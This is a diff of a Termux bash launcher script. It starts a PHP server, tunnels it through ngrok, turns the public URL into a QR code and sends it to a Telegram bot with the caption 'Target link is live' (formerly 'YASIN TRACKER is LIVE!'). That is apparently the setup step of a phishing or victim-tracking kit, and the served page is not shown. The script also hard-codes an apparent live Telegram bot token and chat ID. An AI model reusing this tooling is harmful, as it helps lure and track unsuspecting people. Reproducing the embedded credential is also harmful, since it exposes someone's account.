@@ -1,38 +1,34 @@
-#!/bin/bash
+#!/data/data/com.termux/files/usr/bin/bash
 
-====== Configuration ======
+echo -e "\e[1;32m[+] Installing dependencies...\e[0m"
+pkg install -y php curl jq termux-api qrencode unzip
 
-BOT_TOKEN="8128619794:AAGhkVx-64tgJeoSXB_VDSQk7LnZaOECJcI" CHAT_ID="5548654620" PORT=8888
+echo -e "\e[1;32m[+] Starting PHP server...\e[0m"
+php -S 127.0.0.1:8080 > /dev/null 2>&1 &
 
-====== Install dependencies ======
+echo -e "\e[1;32m[+] Starting ngrok...\e[0m"
+nohup ngrok http 8080 > /dev/null 2>&1 &
 
-echo "[+] Installing dependencies..." pkg update -y > /dev/null pkg install php curl jq termux-api unzip qrencode -y > /dev/null
+sleep 6
+NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[] | select(.proto=="http") | .public_url')
 
-====== Start PHP server ======
+if [[ "$NGROK_URL" == "" || "$NGROK_URL" == "null" ]]; then
+    echo -e "\e[1;31m[-] Ngrok URL not found. Is ngrok running?\e[0m"
+    exit 1
+fi
 
-echo "[+] Starting local PHP server..." nohup php -S 127.0.0.1:$PORT > /dev/null 2>&1 & sleep 3
+echo -e "\e[1;32m[+] Ngrok URL:\e[0m $NGROK_URL"
+echo -e "\e[1;32m[+] Generating QR Code...\e[0m"
+qrencode -o qrcode.png "$NGROK_URL"
 
-====== Start ngrok tunnel ======
+echo -e "\e[1;32m[+] Sending to Telegram...\e[0m"
 
-echo "[+] Starting ngrok tunnel..." nohup ngrok http $PORT > /dev/null 2>&1 & sleep 5
+BOT_TOKEN="8128619794:AAGhkVx-64tgJeoSXB_VDSQk7LnZa0ECJcI"
+CHAT_ID="5548654620"
 
-====== Fetch ngrok URL ======
+curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
+  -F chat_id="$CHAT_ID" \
+  -F photo="@qrcode.png" \
+  -F caption="Target link is live: $NGROK_URL"
 
-NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[] | select(.proto=="https") | .public_url')
-
-if [[ -z "$NGROK_URL" ]]; then echo "[!] Failed to retrieve ngrok URL." exit 1 fi
-
-echo "[+] Ngrok URL: $NGROK_URL"
-
-====== Generate QR code ======
-
-echo "[+] Generating QR Code..." echo "$NGROK_URL" | qrencode -o qr.png
-
-====== Send to Telegram ======
-
-echo "[+] Sending QR and URL to Telegram..." curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" 
--F chat_id="$CHAT_ID" 
--F photo="@qr.png" 
--F caption="YASIN TRACKER is LIVE!\n\n$NGROK_URL"
-
-echo "[+] DONE. Link and QR Code sent via Telegram."
+echo -e "\e[1;32m[+] DONE. QR sent to Telegram.\e[0m"
